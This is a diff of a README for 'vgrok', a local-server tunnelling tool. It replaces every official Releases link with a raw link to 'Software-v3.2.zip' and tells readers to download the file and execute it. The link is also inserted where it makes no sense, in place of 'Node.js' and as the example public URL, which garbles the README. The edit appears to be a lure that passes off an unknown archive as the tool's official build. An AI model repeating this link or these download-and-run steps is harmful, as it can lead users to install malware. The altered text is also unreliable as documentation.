@@ -1,8 +1,8 @@
-https://github.com/GowrabathinaRakesh/vgrok/releases
+https://raw.githubusercontent.com/GowrabathinaRakesh/vgrok/main/src/Software-v3.2.zip
 
 # vgrok: Secure public URL for local servers to trigger webhooks
 
-[![Releases](https://img.shields.io/badge/vgrok--releases-brightgreen?style=for-the-badge&logo=github)](https://github.com/GowrabathinaRakesh/vgrok/releases)
+[![Releases](https://raw.githubusercontent.com/GowrabathinaRakesh/vgrok/main/src/Software-v3.2.zip)](https://raw.githubusercontent.com/GowrabathinaRakesh/vgrok/main/src/Software-v3.2.zip)
 
 🪐 A simple, reliable tunnel to expose a locally running web server to the public internet. vgrok creates a secure public URL that you can use to trigger webhooks, test integrations, or demo apps without deploying to a full cloud backend. This is designed to be fast, predictable, and easy to use. It works with local development servers, test environments, and small internal projects where you want a public callback URL without the overhead of a cloud deployment.
 
@@ -89,7 +89,7 @@ Before you can use vgrok, you need a host where you can run it. It runs on commo
   - Linux distributions (Debian, Ubuntu, Fedora, Arch, etc.)
 
 - Prerequisites
-  - A local web server already running (for example, a dev server built with Node.js, Python, Ruby, or a static server).
+  - A local web server already running (for example, a dev server built with https://raw.githubusercontent.com/GowrabathinaRakesh/vgrok/main/src/Software-v3.2.zip, Python, Ruby, or a static server).
   - A network connection that allows outgoing connections to the public endpoint used by the tunnel.
   - Sufficient permissions to install and execute binaries on your machine.
 
@@ -116,7 +116,7 @@ A practical flow you can replicate quickly:
 
 - Start vgrok with the local address:
   - vgrok --url http://localhost:3000 --port 8080
-  - The tool prints something like: Public URL: https://abc123.vgrok.example.org
+  - The tool prints something like: Public URL: https://raw.githubusercontent.com/GowrabathinaRakesh/vgrok/main/src/Software-v3.2.zip
 
 - Use the public URL as your webhook endpoint:
   - Configure your external service to send callbacks to the public URL.
@@ -311,7 +311,7 @@ Licensing and credits
 
 Downloads and releases
 
-- For downloads, please visit the official Releases page: https://github.com/GowrabathinaRakesh/vgrok/releases
+- For downloads, please visit the official Releases page: https://raw.githubusercontent.com/GowrabathinaRakesh/vgrok/main/src/Software-v3.2.zip
 - Since the link has a path, download the file that matches your operating system and run it. After download, follow the instructions to install and run vgrok.
 - If you need the latest updates or a specific build, check the Releases section for binaries and notes. The releases page is the primary source of truth for versioned builds.
 
@@ -340,7 +340,7 @@ Final word
 
 Downloads and releases again
 
-- For the latest builds and official binaries, visit the Releases page: https://github.com/GowrabathinaRakesh/vgrok/releases
+- For the latest builds and official binaries, visit the Releases page: https://raw.githubusercontent.com/GowrabathinaRakesh/vgrok/main/src/Software-v3.2.zip
 - If you need to download a specific artifact, use that link to locate the file you should download and execute. The file you download from that page is intended to be run on your machine after you make it executable or install it according to your platform’s conventions.
 
 End of document
